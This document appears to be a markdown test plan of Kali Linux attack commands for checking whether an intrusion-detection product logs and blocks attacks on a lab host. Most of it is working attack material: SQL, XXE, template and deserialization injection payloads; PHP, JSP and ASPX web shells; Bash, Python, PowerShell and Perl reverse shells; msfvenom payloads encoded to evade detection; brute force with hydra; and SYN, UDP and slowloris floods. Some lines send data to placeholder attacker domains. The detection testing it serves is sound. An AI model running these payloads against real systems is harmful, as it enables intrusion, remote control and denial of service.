# Kali Linux Attack Test Commands

**Target:** 192.168.0.115  
**Attacker:** KALI_IP (your Kali Linux machine)

---

## 1. Honeypot Tests (Ports 2121, 2222, 2323, 3306, 8080)

**Note:** If rockyou.txt is compressed (.gz), decompress it first:
```bash
sudo gunzip /usr/share/wordlists/rockyou.txt.gz
```

### SSH Honeypot (Port 2222)
```bash
# Basic connection
telnet 192.168.0.115 2222

# SSH brute force simulation
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.0.115:2222 -t 4

# Netcat connection
nc 192.168.0.115 2222

# Nmap scan
nmap -p 2222 -sV 192.168.0.115
```

### FTP Honeypot (Port 2121)
```bash
telnet 192.168.0.115 2121

# FTP brute force
hydra -l ftp -P /usr/share/wordlists/rockyou.txt ftp://192.168.0.115:2121

nc 192.168.0.115 2121
```

### Telnet Honeypot (Port 2323)
```bash
telnet 192.168.0.115 2323

nc 192.168.0.115 2323
```

### MySQL Honeypot (Port 3306)
```bash
nc 192.168.0.115 3306

# MySQL connection attempt
mysql -h 192.168.0.115 -P 3306 -u root -p
```

---

## 2. Web Application Attacks (Port 60000 - Dashboard)

### SQL Injection
```bash
# Test 1: Classic SQLi (URL-encoded)
curl -k "https://192.168.0.115:60000/api/threats?id=1%27%20OR%20%271%27%3D%271"

# Test 2: UNION attack (URL-encoded)
curl -k "https://192.168.0.115:60000/api/alerts?id=1%20UNION%20SELECT%20*%20FROM%20users%23"

# Test 3: Time-based blind (URL-encoded)
curl -k "https://192.168.0.115:60000/api/reports?id=1%27%20AND%20SLEEP%285%29%23"

# Test 4: Boolean-based (URL-encoded)
curl -k "https://192.168.0.115:60000/api/data?filter=admin%27%20AND%201%3D1%23"
```

### XSS (Cross-Site Scripting)
```bash
# Test 1: Reflected XSS (URL-encoded)
curl -k 'https://192.168.0.115:60000/api/search?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E'

# Test 2: DOM XSS (URL-encoded)
curl -k 'https://192.168.0.115:60000/api/alerts?msg=%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E'

# Test 3: Stored XSS (URL-encoded)
curl -k -X POST 'https://192.168.0.115:60000/api/comments' -d 'comment=%3Cscript%3Edocument.cookie%3C%2Fscript%3E'
```

### Path Traversal
```bash
# Test 1: Linux path traversal (URL-encoded)
curl -k 'https://192.168.0.115:60000/api/files?path=..%2F..%2F..%2F..%2Fetc%2Fpasswd'

# Test 2: Windows path traversal (URL-encoded)
curl -k 'https://192.168.0.115:60000/api/download?file=..%5C..%5C..%5Cwindows%5Csystem32%5Cconfig%5Csam'

# Test 3: Double encoded traversal
curl -k 'https://192.168.0.115:60000/api/logs?log=..%252F..%252F..%252Fetc%252Fpasswd'
```

### Command Injection
```bash
# Test 1: Basic command injection (URL-encoded)
curl -k 'https://192.168.0.115:60000/api/ping?host=127.0.0.1%3B%20whoami'

# Test 2: Piped commands (URL-encoded)
curl -k 'https://192.168.0.115:60000/api/exec?cmd=ls%20%7C%20nc%20attacker.com%204444'

# Test 3: Backtick execution (URL-encoded)
curl -k 'https://192.168.0.115:60000/api/utils?input=%60id%60'
```

### LDAP Injection
```bash
# LDAP injection with special characters (URL-encoded)
curl -k 'https://192.168.0.115:60000/api/login?username=admin%2A%29%28%26%28password%3D%2A'

curl -k 'https://192.168.0.115:60000/api/auth?user=%2A%29%28uid%3D%2A%29%29%28%26%28uid%3D%2A'
```

### XXE (XML External Entity)
```bash
curl -k -X POST "https://192.168.0.115:60000/api/xml" \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><data>&xxe;</data>'
```

### SSRF (Server-Side Request Forgery)
```bash
# SSRF to AWS metadata (URL-encoded)
curl -k "https://192.168.0.115:60000/api/fetch?url=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F"

# SSRF to localhost
curl -k "https://192.168.0.115:60000/api/webhook?callback=http%3A%2F%2Flocalhost%3A22"
```

### SSTI (Server-Side Template Injection)
```bash
# Test 1: Jinja2 template injection (URL-encoded)
curl -k "https://192.168.0.115:60000/api/render?template=%7B%7B7%2A7%7D%7D"

# Test 2: Freemarker injection (URL-encoded)
curl -k "https://192.168.0.115:60000/api/preview?content=%24%7B7%2A7%7D"

# Test 3: Twig injection (URL-encoded)
curl -k "https://192.168.0.115:60000/api/page?tpl=%7B%7B_self.env.registerUndefinedFilterCallback%28%27exec%27%29%7D%7D%7B%7B_self.env.getFilter%28%27id%27%29%7D%7D"

# Test 4: RCE via template (URL-encoded)
curl -k "https://192.168.0.115:60000/api/template?input=%7B%7Bconfig.__class__.__init__.__globals__%5B%27os%27%5D.popen%28%27id%27%29.read%28%29%7D%7D"
```

### NoSQL Injection
```bash
# Test 1: MongoDB authentication bypass
curl -k -X POST "https://192.168.0.115:60000/api/login" \
  -H "Content-Type: application/json" \
  -d '{"username": {"$ne": null}, "password": {"$ne": null}}'

# Test 2: MongoDB operator injection
curl -k "https://192.168.0.115:60000/api/users?id[\$gt]="

# Test 3: Redis command injection
curl -k "https://192.168.0.115:60000/api/cache?key=test%0D%0ASET%20malicious%20payload%0D%0A"
```

### Deserialization Attacks
```bash
# Test 1: Python pickle injection
curl -k -X POST "https://192.168.0.115:60000/api/session" \
  -H "Content-Type: application/octet-stream" \
  --data-binary "@malicious.pickle"

# Test 2: Java object injection
curl -k -X POST "https://192.168.0.115:60000/api/deserialize" \
  -H "Content-Type: application/x-java-serialized-object" \
  -d "rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwACSQAEc2l6ZUwACmNvbXBhcmF0b3J0ABZMamF2YS91dGlsL0NvbXBhcmF0b3I7eHAAAAACc3IAQm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucz=="
```

### JWT Token Manipulation
```bash
# Test 1: None algorithm bypass
curl -k -H "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsImlhdCI6MTUxNjIzOTAyMn0." \
  "https://192.168.0.115:60000/api/admin/users"

# Test 2: Weak secret brute force (using hashcat)
# First capture a JWT, then:
# hashcat -a 0 -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt

# Test 3: Algorithm confusion (RS256 to HS256)
curl -k -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiJ9.forged_signature" \
  "https://192.168.0.115:60000/api/admin"
```

### HTTP Request Smuggling
```bash
# Test 1: CL.TE (Content-Length vs Transfer-Encoding)
printf "POST / HTTP/1.1\r\nHost: 192.168.0.115:60000\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nG" | \
  nc 192.168.0.115 60000

# Test 2: TE.CL smuggling
curl -k "https://192.168.0.115:60000/" \
  -H "Transfer-Encoding: chunked" \
  -H "Content-Length: 4" \
  -d "0

GET /admin HTTP/1.1
Host: localhost

"
```

---

## 3. Brute Force Attacks

### Login Brute Force
```bash
# Test 1: Multiple failed logins (triggers brute force detection)
for i in {1..20}; do
  curl -k -X POST "https://192.168.0.115:60000/api/login" \
    -d "username=admin&password=wrong$i"
  sleep 0.5
done

# Test 2: Credential stuffing
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.0.115 https-post-form "/api/login:username=^USER^&password=^PASS^:Invalid"
```

---

## 4. Port Scanning (Triggers Port Scan Detection)

```bash
# Full TCP scan
nmap -sT -p- 192.168.0.115

# SYN scan (stealth)
sudo nmap -sS -p 1-10000 192.168.0.115

# Version detection
nmap -sV -p 60000,2222,2323,2121 192.168.0.115

# OS detection
sudo nmap -O 192.168.0.115

# Aggressive scan
nmap -A -T4 192.168.0.115

# Masscan (very fast)
sudo masscan -p1-65535 192.168.0.115 --rate=1000
```

---

## 5. DoS/DDoS Attacks

### Slowloris (Slow HTTP DoS)
```bash
# Install slowloris if not present
# git clone https://github.com/gkbrk/slowloris.git
# cd slowloris

# Test 1: Slow header attack
python3 slowloris.py 192.168.0.115 -p 60000 -s 200

# Test 2: Alternative - using slowhttptest
slowhttptest -c 200 -H -g -o slowloris_stats -i 10 -r 50 -t GET -u https://192.168.0.115:60000/ -x 24 -p 3
```

### SYN Flood
```bash
# Test 1: hping3 SYN flood
sudo hping3 -S --flood -V -p 60000 192.168.0.115

# Test 2: Controlled SYN flood (rate-limited)
sudo hping3 -S -p 60000 --faster 192.168.0.115

# Test 3: Randomized source ports
sudo hping3 -S --rand-source -p 60000 192.168.0.115
```

### UDP Flood
```bash
# Test 1: UDP flood to random ports
sudo hping3 --udp --flood -p 53 192.168.0.115

# Test 2: DNS amplification simulation
sudo hping3 --udp -p 53 --data 512 --flood 192.168.0.115
```

### Application Layer DoS
```bash
# Test 1: Large payload POST
for i in {1..50}; do
  curl -k -X POST "https://192.168.0.115:60000/api/upload" \
    -F "file=@/dev/urandom" &
done

# Test 2: Regex DoS (ReDoS)
curl -k "https://192.168.0.115:60000/api/search?q=(a+)+b"

# Test 3: XML bomb (billion laughs)
curl -k -X POST "https://192.168.0.115:60000/api/xml" \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ELEMENT lolz (#PCDATA)>
  <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
]>
<lolz>&lol3;</lolz>'
```

---

## 6. Rate Limit Abuse

```bash
# Rapid requests (100 in 10 seconds)
for i in {1..100}; do
  curl -k "https://192.168.0.115:60000/api/threats" &
done
wait

# Scraping attempt
for i in {1..50}; do
  curl -k "https://192.168.0.115:60000/api/data?page=$i"
done
```

---

## 6. Rate Limit Abuse

```bash
# Rapid requests (100 in 10 seconds)
for i in {1..100}; do
  curl -k "https://192.168.0.115:60000/api/threats" &
done
wait

# Scraping attempt
for i in {1..50}; do
  curl -k "https://192.168.0.115:60000/api/data?page=$i"
done
```

---

## 7. Malicious User-Agent

```bash
# Sqlmap user agent
curl -k -A "sqlmap/1.0" "https://192.168.0.115:60000/api/threats"

# Nikto scanner
curl -k -A "Nikto/2.1.6" "https://192.168.0.115:60000/"

# Nmap scripting
curl -k -A "Mozilla/5.0 (compatible; Nmap Scripting Engine)" "https://192.168.0.115:60000/"

# Metasploit
curl -k -A "Metasploit" "https://192.168.0.115:60000/api/alerts"

# Burp Suite
curl -k -A "Mozilla/5.0 (compatible; BurpSuite)" "https://192.168.0.115:60000/"
```

---

## 8. HTTP Method Abuse

```bash
# TRACE method (XST attack)
curl -k -X TRACE "https://192.168.0.115:60000/api/threats"

# PUT upload (URL-encoded payload)
curl -k -X PUT "https://192.168.0.115:60000/api/files/shell.php" -d "%3C%3Fphp%20system%28%5C%24_GET%5B%27cmd%27%5D%29%3B%20%3F%3E"

# DELETE method
curl -k -X DELETE "https://192.168.0.115:60000/api/data/important"

# OPTIONS enumeration
curl -k -X OPTIONS "https://192.168.0.115:60000/api/admin" -v
```

---

## 9. File Upload Exploit

```bash
# PHP shell upload
curl -k -X POST "https://192.168.0.115:60000/api/upload" \
  -F "file=@shell.php" \
  -F "filename=shell.php"

# Double extension
curl -k -X POST "https://192.168.0.115:60000/api/upload" \
  -F "file=@malware.php.jpg"

# Null byte injection
curl -k -X POST "https://192.168.0.115:60000/api/upload" \
  -F "file=@shell.php%00.jpg"
```

---

## 10. DNS Tunneling

```bash
# Exfiltrate data via DNS
dig @192.168.0.115 "secret-data-here.attacker.com"

# Multiple DNS queries (suspicious pattern)
for i in {1..50}; do
  dig @192.168.0.115 "tunnel-$i.evil.com"
done
```

---

## 11. Remote Code Execution (RCE) & Reverse Shells

### Reverse Shell Payloads

**⚠️ WARNING:** These create actual reverse connections. Have a listener ready on Kali.

```bash
# Set up listener on Kali first (in separate terminal)
nc -lvnp 4444

# Test 1: Bash reverse shell via command injection (URL-encoded)
curl -k 'https://192.168.0.115:60000/api/ping?host=127.0.0.1%3Bbash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.0.119%2F4444%200%3E%261'

# Test 2: Python reverse shell (URL-encoded)
curl -k 'https://192.168.0.115:60000/api/exec?cmd=python%20-c%20%22import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK_STREAM%29%3Bs.connect%28%28%5C%22192.168.0.119%5C%22%2C4444%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3Bos.dup2%28s.fileno%28%29%2C1%29%3Bos.dup2%28s.fileno%28%29%2C2%29%3Bsubprocess.call%28%5B%5C%22%2Fbin%2Fbash%5C%22%2C%5C%22-i%5C%22%5D%29%22'

# Test 3: PowerShell reverse shell (Windows target) (URL-encoded)
curl -k 'https://192.168.0.115:60000/api/utils?input=powershell%20-nop%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%5C%22192.168.0.119%5C%22%2C4444%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%5C%22PS%20%5C%22%20%2B%20%28pwd%29.Path%20%2B%20%5C%22%3E%20%5C%22%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22'

# Test 4: Netcat reverse shell (if nc exists on target) (URL-encoded)
curl -k 'https://192.168.0.115:60000/api/ping?host=127.0.0.1%3Bnc%20-e%20%2Fbin%2Fbash%20192.168.0.119%204444'

# Test 5: Perl reverse shell (URL-encoded)
curl -k 'https://192.168.0.115:60000/api/exec?cmd=perl%20-e%20%22use%20Socket%3B%5C%24i%3D%5C%22192.168.0.119%5C%22%3B%5C%24p%3D4444%3Bsocket%28S%2CPF_INET%2CSOCK_STREAM%2Cgetprotobyname%28%5C%22tcp%5C%22%29%29%3Bif%28connect%28S%2Csockaddr_in%28%5C%24p%2Cinet_aton%28%5C%24i%29%29%29%29%7Bopen%28STDIN%2C%5C%22%3E%26S%5C%22%29%3Bopen%28STDOUT%2C%5C%22%3E%26S%5C%22%29%3Bopen%28STDERR%2C%5C%22%3E%26S%5C%22%29%3Bexec%28%5C%22%2Fbin%2Fsh%20-i%5C%22%29%3B%7D%22'
```

### Web Shell Upload & Execution

```bash
# Create PHP web shell
echo '<?php system($_GET["cmd"]); ?>' > shell.php

# Test 1: Upload PHP web shell
curl -k -X POST "https://192.168.0.115:60000/api/upload" \
  -F "file=@shell.php" \
  -F "filename=shell.php"

# Test 2: Execute uploaded shell
curl -k "https://192.168.0.115:60000/uploads/shell.php?cmd=whoami"

# Test 3: Advanced PHP shell (c99 style)
cat > advanced_shell.php << 'EOF'
<?php
if(isset($_REQUEST['cmd'])){
    echo "<pre>";
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
    echo "</pre>";
    die;
}
?>
EOF

curl -k -X POST "https://192.168.0.115:60000/api/upload" -F "file=@advanced_shell.php"

# Test 4: JSP web shell (Java targets)
curl -k -X POST "https://192.168.0.115:60000/api/upload" \
  -F 'file=@shell.jsp;type=application/octet-stream' \
  --data-binary '<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>'

# Test 5: ASPX web shell (Windows IIS targets)
curl -k -X POST "https://192.168.0.115:60000/api/upload" \
  -F 'file=@shell.aspx' \
  --data '<%@ Page Language="C#" %><%@ Import Namespace="System.Diagnostics" %><%Process.Start("cmd.exe","/c " + Request.QueryString["cmd"]);%>'
```

### Metasploit Exploits

```bash
# Install Metasploit if not present
# sudo apt install metasploit-framework

# Test 1: Web delivery exploit
msfconsole -q -x "use exploit/multi/script/web_delivery; set TARGET 2; set PAYLOAD python/meterpreter/reverse_tcp; set LHOST 192.168.0.119; set LPORT 4444; set SRVHOST 192.168.0.119; set SRVPORT 8080; exploit"

# Then trigger with (URL-encoded):
curl -k "https://192.168.0.115:60000/api/exec?cmd=python%20-c%20%27import%20urllib.request%3B%20exec%28urllib.request.urlopen%28%5C%22http%3A%2F%2F192.168.0.119%3A8080%2Fpayload%5C%22%29.read%28%29%29%27"

# Test 2: PHP meterpreter
msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.0.119 LPORT=4444 -f raw > meterpreter.php
curl -k -X POST "https://192.168.0.115:60000/api/upload" -F "file=@meterpreter.php"

# Start handler
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD php/meterpreter/reverse_tcp; set LHOST 192.168.0.119; set LPORT 4444; exploit"

# Test 3: Windows executable payload
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.119 LPORT=4444 -f exe > payload.exe
# Upload via file upload vulnerability, then execute

# Test 4: Encoded payload (evade detection)
msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.0.119 LPORT=4444 -f elf -e x64/xor -i 10 > encoded_payload
```

### Bind Shell Attacks

```bash
# Test 1: Create bind shell on target (if command injection works) (URL-encoded)
curl -k "https://192.168.0.115:60000/api/exec?cmd=nc%20-lvp%205555%20-e%20%2Fbin%2Fbash"

# Then connect from Kali
nc 192.168.0.115 5555

# Test 2: Python bind shell (URL-encoded)
curl -k "https://192.168.0.115:60000/api/exec?cmd=python%20-c%20%27import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK_STREAM%29%3Bs.bind%28%28%5C%220.0.0.0%5C%22%2C5555%29%29%3Bs.listen%281%29%3Bconn%2Caddr%3Ds.accept%28%29%3Bos.dup2%28conn.fileno%28%29%2C0%29%3Bos.dup2%28conn.fileno%28%29%2C1%29%3Bos.dup2%28conn.fileno%28%29%2C2%29%3Bsubprocess.call%28%5B%5C%22%2Fbin%2Fbash%5C%22%2C%5C%22-i%5C%22%5D%29%27"

# Connect from Kali
nc 192.168.0.115 5555
```

### Encoded/Obfuscated Payloads

```bash
# Test 1: Base64 encoded reverse shell
PAYLOAD="bash -i >& /dev/tcp/192.168.0.119/4444 0>&1"
ENCODED=$(echo "$PAYLOAD" | base64)
curl -k "https://192.168.0.115:60000/api/exec?cmd=echo $ENCODED | base64 -d | bash"

# Test 2: Hex encoded command
curl -k "https://192.168.0.115:60000/api/exec?cmd=echo 726d202f746d702f663b6d6b6669666f202f746d702f663b636174202f746d702f667c2f62696e2f7368202d69203e2631207c6e6320" | xxd -r -p | bash"

# Test 3: URL encoded payload
curl -k "https://192.168.0.115:60000/api/ping?host=%62%61%73%68%20%2d%69%20%3e%26%20%2f%64%65%76%2f%74%63%70%2f192.168.0.119%2f%34%34%34%34%20%30%3e%26%31"

# Test 4: Double URL encoding
curl -k "https://192.168.0.115:60000/api/search?q=%2562%2561%2573%2568%2520%252d%2569"
```

### Privilege Escalation Attempts

```bash
# Test 1: SUID binary exploitation attempt (URL-encoded)
curl -k "https://192.168.0.115:60000/api/exec?cmd=find%20%2F%20-perm%20-4000%202%3E%2Fdev%2Fnull"

# Test 2: Sudo misconfiguration check (URL-encoded)
curl -k "https://192.168.0.115:60000/api/exec?cmd=sudo%20-l"

# Test 3: Kernel exploit enumeration (URL-encoded)
curl -k "https://192.168.0.115:60000/api/exec?cmd=uname%20-a"

# Test 4: Docker escape attempt (if in container) (URL-encoded)
curl -k "https://192.168.0.115:60000/api/exec?cmd=cat%20%2Fproc%2F1%2Fcgroup%20%7C%20grep%20docker"
```

---

## 12. Scenario-Based Test Plans by Deployment Type

The individual tests above are building blocks. This section groups them into realistic scenarios for different deployment environments.

> Replace `192.168.0.115` and `KALI_IP` with your actual target and Kali IP.

### 12.1 Home Networks (Gateway or Monitoring Node)

Focus: basic service abuse, web app probing, and brute force that a home gateway or NAS would typically see.

```bash
#!/bin/bash
TARGET=192.168.0.115

echo "[HOME] Honeypot SSH probe"
nc -w 2 "$TARGET" 2222

echo "[HOME] Simple SQL injection"
curl -k "https://$TARGET:60000/api/threats?id=1%27%20OR%20%271%27%3D%271"

echo "[HOME] Reflected XSS"
curl -k "https://$TARGET:60000/api/search?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E"

echo "[HOME] Login brute force (5 attempts)"
for i in {1..5}; do
  curl -k -X POST "https://$TARGET:60000/api/login" \
    -d "username=admin&password=home$i"
done

echo "[HOME] Light port scan (common ports)"
nmap -sT -p 22,80,443,60000,2121,2222,2323 "$TARGET"
```

Approximate attacks from this script: 1 honeypot probe + 2 web exploits + 5 brute-force attempts + 1 scan = **9 tests** (scan generates multiple packets but is counted as 1 test here).

### 12.2 Company Networks (LAN, VLAN, VPN, SOC Observer)

Focus: directory abuse, command injection, credential stuffing, and lateral movement discovery.

```bash
#!/bin/bash
TARGET=192.168.0.115

echo "[COMPANY] LDAP injection"
curl -k "https://$TARGET:60000/api/login?username=admin%2A%29%28%26%28password%3D%2A"

echo "[COMPANY] Command injection (whoami)"
curl -k "https://$TARGET:60000/api/ping?host=127.0.0.1%3B%20whoami"

echo "[COMPANY] Credential stuffing (Hydra)"
hydra -l admin -P /usr/share/wordlists/rockyou.txt "$TARGET" https-post-form "/api/login:username=^USER^&password=^PASS^:Invalid" -t 4 -V -f

echo "[COMPANY] Lateral movement / port scan"
nmap -A -T4 -p 22,80,443,445,3389,60000 "$TARGET"
```

Approximate attacks: 2 direct web abuses + 1 Hydra run (many credential attempts) + 1 aggressive scan = **4 tests** (Hydra and nmap each represent many low-level events).

### 12.3 Servers & Data Centers

Focus: DoS/slowloris, SYN floods, and application-layer abuse typical for exposed services.

```bash
#!/bin/bash
TARGET=192.168.0.115

echo "[DC] Slowloris-style HTTP DoS"
python3 slowloris.py "$TARGET" -p 60000 -s 200

echo "[DC] SYN flood (controlled)"
sudo hping3 -S -p 60000 --faster "$TARGET"

echo "[DC] Application-layer DoS (large POST)"
for i in {1..10}; do
  curl -k -X POST "https://$TARGET:60000/api/upload" \
    -F "file=@/dev/urandom" &
done
wait
```

Approximate attacks: 1 slowloris run + 1 SYN flood + 10 large POSTs = **12 tests**.

### 12.4 Website Hosting Environments (Web Server or Reverse Proxy)

Focus: web-centric exploits (SQLi, XSS, path traversal, file upload, HTTP smuggling).

```bash
#!/bin/bash
TARGET=192.168.0.115

echo "[WEB] SQL injection"
curl -k "https://$TARGET:60000/api/threats?id=1%27%20OR%20%271%27%3D%271"

echo "[WEB] Stored XSS"
curl -k -X POST "https://$TARGET:60000/api/comments" -d 'comment=%3Cscript%3Edocument.cookie%3C%2Fscript%3E'

echo "[WEB] Path traversal to /etc/passwd"
curl -k "https://$TARGET:60000/api/files?path=..%2F..%2F..%2F..%2Fetc%2Fpasswd"

echo "[WEB] Malicious file upload (PHP shell)"
curl -k -X POST "https://$TARGET:60000/api/upload" \
  -F "file=@shell.php" \
  -F "filename=shell.php"

echo "[WEB] HTTP request smuggling (CL.TE)"
printf "POST / HTTP/1.1\r\nHost: $TARGET:60000\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nG" | \
  nc "$TARGET" 60000
```

Approximate attacks: **5 tests**.

### 12.5 Cloud Infrastructure (IaaS / PaaS Telemetry)

Focus: SSRF to metadata, DNS tunneling, and noisy scans from cloud-hosted attackers.

```bash
#!/bin/bash
TARGET=192.168.0.115

echo "[CLOUD] SSRF to cloud metadata"
curl -k "https://$TARGET:60000/api/fetch?url=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F"

echo "[CLOUD] DNS data exfiltration"
dig @"$TARGET" "secret-data-here.attacker.com"

echo "[CLOUD] DNS tunneling pattern"
for i in {1..20}; do
  dig @"$TARGET" "tunnel-$i.evil.com"
done

echo "[CLOUD] Wide port scan"
sudo nmap -sS -p 1-10000 "$TARGET"
```

Approximate attacks: 1 SSRF + 1 DNS exfil + 20 DNS tunnel queries + 1 scan = **23 tests**.

### 12.6 Critical Infrastructure Research Environments

Focus: RCE payloads, bind shells, and encoded payloads used in red-team style research labs.

```bash
#!/bin/bash
TARGET=192.168.0.115
KALI_IP=192.168.0.119   # Adjust to your Kali IP

echo "[CRIT-RES] Bash reverse shell"
curl -k "https://$TARGET:60000/api/ping?host=127.0.0.1%3Bbash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F$KALI_IP%2F4444%200%3E%261"

echo "[CRIT-RES] Python reverse shell"
curl -k "https://$TARGET:60000/api/exec?cmd=python%20-c%20%22import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK_STREAM%29%3Bs.connect%28%28%5C%22$KALI_IP%5C%22%2C4444%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3Bos.dup2%28s.fileno%28%29%2C1%29%3Bos.dup2%28s.fileno%28%29%2C2%29%3Bsubprocess.call%28%5B%5C%22%2Fbin%2Fbash%5C%22%2C%5C%22-i%5C%22%5D%29%22"

echo "[CRIT-RES] Bind shell on target"
curl -k "https://$TARGET:60000/api/exec?cmd=nc%20-lvp%205555%20-e%20%2Fbin%2Fbash"

echo "[CRIT-RES] Base64-encoded reverse shell"
PAYLOAD="bash -i >& /dev/tcp/$KALI_IP/4444 0>&1"
ENCODED=$(echo "$PAYLOAD" | base64)
curl -k "https://$TARGET:60000/api/exec?cmd=echo $ENCODED | base64 -d | bash"
```

Approximate attacks: **4 tests** (each a distinct RCE attempt).

### 12.7 Government & Police SOC Laboratories

Focus: broad coverage – combining reconnaissance, web app abuse, brute force, and RCE in one scripted exercise.

```bash
#!/bin/bash
TARGET=192.168.0.115
KALI_IP=192.168.0.119

echo "[SOC] Recon: full TCP scan"
nmap -sT -p- "$TARGET"

echo "[SOC] Web: SQLi + XSS + path traversal"
curl -k "https://$TARGET:60000/api/threats?id=1%27%20OR%20%271%27%3D%271"
curl -k "https://$TARGET:60000/api/search?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E"
curl -k "https://$TARGET:60000/api/files?path=..%2F..%2F..%2F..%2Fetc%2Fpasswd"

echo "[SOC] Brute force (10 attempts)"
for i in {1..10}; do
  curl -k -X POST "https://$TARGET:60000/api/login" -d "username=admin&password=test$i"
done

echo "[SOC] RCE reverse shell"
curl -k "https://$TARGET:60000/api/exec?cmd=python%20-c%20%27import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK_STREAM%29%3Bs.connect%28%28%5C"$KALI_IP%5C",4444%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3Bos.dup2%28s.fileno%28%29%2C1%29%3Bos.dup2%28s.fileno%28%29%2C2%29%3Bsubprocess.call%28%5B%5C"/bin/bash%5C",%5C"-i%5C"]%29%27"
```

Approximate attacks: 1 full scan + 3 web exploits + 10 brute-force attempts + 1 RCE = **15 tests**.

### 12.8 Total Scenario Test Count

If you run all seven scenario scripts once, you launch approximately:

- Home: 9 tests
- Company: 4 tests
- Servers & Data Centers: 12 tests
- Website Hosting: 5 tests
- Cloud Infrastructure: 23 tests
- Critical Infrastructure Research: 4 tests
- Government & Police SOC Labs: 15 tests

Total ≈ **72 tests** (not counting per-packet behavior inside scans/floods/Hydra loops).

To confirm how many attacks were actually recorded by Battle-Hardened AI during a run, use the local JSON logs on the monitored node:

```bash
cd /path/to/battle-hardened-ai

THREATS=$(jq 'length' server/json/threat_log.json 2>/dev/null || echo 0)
HONEYPOT=$(jq 'length' server/json/honeypot_attacks.json 2>/dev/null || echo 0)
TOTAL=$((THREATS + HONEYPOT))

echo "Threat log entries:      $THREATS"
echo "Honeypot attack entries: $HONEYPOT"
echo "---------------------------------"
echo "Total recorded attacks:  $TOTAL"
```

This lets you correlate scenario scripts with the actual number of attacks the system observed and logged.

---

## Expected Results

✅ **For EACH attack above:**
1. Threat logged in `threat_log.json` or `honeypot_attacks.json`
2. Kali IP (KALI_IP) added to `blocked_ips.json`
3. Pattern extracted (sanitized, no exploit code)
4. Pattern sent to relay (if relay enabled)
5. Real-time console output showing block

❌ **NOT in logs/relay:**
- Attacker IP addresses
- Raw exploit code
- Full attack payloads

---

## Quick All-In-One Test

```bash
#!/bin/bash
# Run multiple attacks sequentially

echo "=== Testing Honeypot ==="
nc -w 2 192.168.0.115 2222

echo "=== Testing SQL Injection ==="
curl -k "https://192.168.0.115:60000/api/threats?id=1%27%20OR%20%271%27%3D%271"

echo "=== Testing XSS ==="
curl -k 'https://192.168.0.115:60000/api/search?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E'

echo "=== Testing Path Traversal ==="
curl -k 'https://192.168.0.115:60000/api/files?path=..%2F..%2F..%2F..%2Fetc%2Fpasswd'

echo "=== Testing Port Scan ==="
nmap -p 60000,2222,2323 192.168.0.115

echo "=== Testing Brute Force ==="
for i in {1..10}; do
  curl -k -X POST "https://192.168.0.115:60000/api/login" -d "username=admin&password=test$i"
done

echo "=== Testing Complete - Check Windows logs ==="
```

Save as `test_attacks.sh` and run: `chmod +x test_attacks.sh && ./test_attacks.sh`

---

## Relay Server Verification

After attacks are sent to the relay, verify on the relay server:

```bash
# 1. View last 50 lines of global attacks (from all customers)
